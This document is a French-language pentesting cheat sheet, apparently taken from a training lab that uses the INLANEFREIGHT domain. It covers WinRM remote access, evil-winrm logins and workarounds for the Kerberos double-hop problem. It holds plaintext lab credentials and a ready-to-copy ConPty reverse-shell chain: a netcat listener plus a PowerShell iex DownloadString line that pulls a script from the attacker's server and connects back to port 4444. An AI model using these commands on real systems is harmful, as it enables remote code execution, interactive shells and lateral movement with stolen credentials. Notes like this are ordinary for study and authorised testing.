

# WINDOWS

## Enter-PSSession

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
```
 
```powershell
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```


# LINUX

## Evil-WinRM (attention shell non interactif, penser a importer un autre shell afterward (ConPty par ex))

```sh
evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
```

## ConPty

attacker

```
wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1
```

```
python3 -m http.server 80
```

```
stty raw -echo; (stty size; cat) | nc -lvnp 4444
```

target

```
iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 192.168.1.3 4444
```


# KERBEROS DOUBLE HOP

> [!TIP]
> Lors de la connexion WINRM, les creds utilisés ne sont pas enregistrés en cache dans la session distante, ce qui empêche d'accéder aux autres ressources sans spécifier les creds.
> 2 Workaround:
> - Créer un PSCredential object
> - Register-PSSessionConfiguration


## PSCredential Object

Se réauthentifier dans la session powershell avec PSCredential (puis passer $cred en argument à chaque fois)

```Powershell
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```


## Register PSSession Configuration


Enregistrer la configuration de session avec les identifiants

```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

Redémarrer le service WinRM

```powershell
Restart-Service WinRM
```

Se connecter à la session en utilisant Enter-PSSESSION en spécifiant la configuration

```powershell
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
```
